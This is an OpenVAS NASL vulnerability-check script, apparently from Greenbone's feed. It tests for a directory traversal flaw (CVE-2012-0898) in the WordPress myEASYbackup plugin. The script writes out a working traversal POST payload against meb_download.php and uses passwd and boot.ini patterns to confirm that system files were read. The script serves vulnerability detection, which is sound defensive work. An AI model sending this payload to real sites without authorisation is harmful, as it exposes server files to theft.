###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_myeasybackup_plugin_dir_trav_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# WordPress myEASYbackup Plugin 'dwn_file' Parameter Directory Traversal Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation could allow attackers to read arbitrary
files via directory traversal attacks and gain sensitive information.

Impact Level: Application";

tag_affected = "WordPress myEASYbackup Plugin version 1.0.8.1";

tag_insight = "The flaw is due to an input validation error in 'dwn_file'
parameter to 'wp-content/plugins/myeasybackup/meb_download.php', which allows
attackers to read arbitrary files via a ../(dot dot) sequences.";

tag_solution = "Upgrade to WordPress myEASYbackup Plugin version 1.0.9 or
later. For updates refer to http://wordpress.org/extend/plugins/myeasybackup/";

tag_summary = "This host is running with WordPress myEASYbackup Plugin and is
prone to directory traversal vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802380";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 7577 $");
  script_cve_id("CVE-2012-0898");
  script_bugtraq_id(51433);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2012-01-17 12:16:44 +0530 (Tue, 17 Jan 2012)");
  script_name("WordPress myEASYbackup Plugin 'dwn_file' Parameter Directory Traversal Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47594");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/47594");
  script_xref(name : "URL" , value : "http://forums.cnet.com/7726-6132_102-5261356.html");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/108711/wpmyeasybackup-traversal.txt");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("version_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Get HTTP Port

if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Host Name or IP
host = get_host_name();
if(!host){
  exit(0);
}

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);


files = traversal_files();

foreach file (keys(files))
{
  ## Construct directory traversal attack
  postData = "dwn_file=..%2F..%2F..%2F..%2F"+ files[file] + "&submit=submit";
  path = dir + "/wp-content/plugins/myeasybackup/meb_download.php";

  ## Construct attack post request
  req = string("POST ", path, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postData),
               "\r\n\r\n", postData);

  ## Send post request and Receive the response
  res = http_send_recv(port:port, data:req);

  ## Confirm exploit works
  if(egrep(pattern:"(root:.*:0:[01]:|\[boot loader\])", string:res))
  {
    security_message(port);
    exit(0);
  }
}
